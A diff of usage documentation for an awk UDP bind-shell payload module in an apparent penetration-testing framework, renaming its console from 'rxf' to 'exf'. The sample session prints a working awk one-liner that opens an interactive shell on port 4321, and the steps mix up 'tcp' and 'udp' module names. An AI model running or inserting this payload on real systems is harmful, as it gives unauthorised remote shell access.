@@ -4,7 +4,7 @@ Module generates payload that creates interactive udp bind shell by using awk.
 
 ## Verification Steps
 
-  1. Start `./rxf.py`
+  1. Start `./exf.py`
   2. Do: `use payloads/cmd/awk_bind_tcp`
   3. Do: `set rport 4321`
   4. Do: `run`
@@ -13,10 +13,10 @@ Module generates payload that creates interactive udp bind shell by using awk.
 ## Scenarios
 
 ```
-rxf > use payloads/cmd/awk_bind_udp
-rxf (Awk Bind UDP) > set rport 4321
+exf > use payloads/cmd/awk_bind_udp
+exf (Awk Bind UDP) > set rport 4321
 [+] rport => 4321
-rxf (Awk Bind UDP) > run
+exf (Awk Bind UDP) > run
 [*] Running module...
 [*] Generating payload
 awk 'BEGIN{s="/inet/udp/4321/0/0";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'
